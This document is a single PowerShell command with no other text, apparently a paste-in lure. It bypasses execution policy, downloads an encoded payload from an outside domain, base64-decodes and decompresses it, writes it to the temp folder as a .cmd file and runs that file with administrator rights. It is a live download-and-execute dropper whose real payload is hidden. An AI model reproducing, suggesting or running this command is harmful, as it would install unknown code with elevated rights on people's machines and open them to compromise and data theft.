powershell -NoProfile -ExecutionPolicy Bypass -Command "$d=(Invoke-WebRequest -Uri 'https://capcurekey.hanadesu.my.id' -UseBasicParsing).Content; $b=[Convert]::FromBase64String($d); $m=New-Object IO.MemoryStream(,$b); $g=New-Object IO.Compression.GzipStream($m,[IO.Compression.CompressionMode]::Decompress); $o=New-Object IO.MemoryStream; $g.CopyTo($o); $f=Join-Path $env:TEMP 'aw10.cmd'; [IO.File]::WriteAllBytes($f,$o.ToArray()); Start-Process -FilePath $f -Verb RunAs"
